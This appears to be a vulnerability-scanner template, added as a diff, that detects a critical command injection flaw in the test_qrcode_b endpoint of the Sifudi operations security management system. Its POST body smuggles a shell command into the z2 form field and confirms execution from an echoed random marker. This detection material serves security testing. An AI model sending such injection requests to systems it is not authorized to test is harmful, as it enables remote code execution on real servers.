@@ -1,0 +1,33 @@
+id: poc-yaml-safety-operation-security-manager-system-test_qrcode_b-rce
+info:
+  name: 思福迪运维安全管理系统 test_qrcode_b 命令注入漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 两高一弱,命令注入
+  description: |
+    思福迪运维安全管理系统存在 test_qrcode_b 命令注入漏洞，攻击者可以利用该漏洞执行任意命令。
+
+variables:
+  t1: "{{rand_base(12)}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/bhost/test_qrcode_b"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      Referer: "{{BaseURL}}/bhost"
+    body: "z1=1&z2=\"|echo {{t1}};\"&z3=bhost"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t1}}"
+        part: body
+      - type: word
+        words:
+          - "text/html; charset=utf-8"
+        part: header.content-type
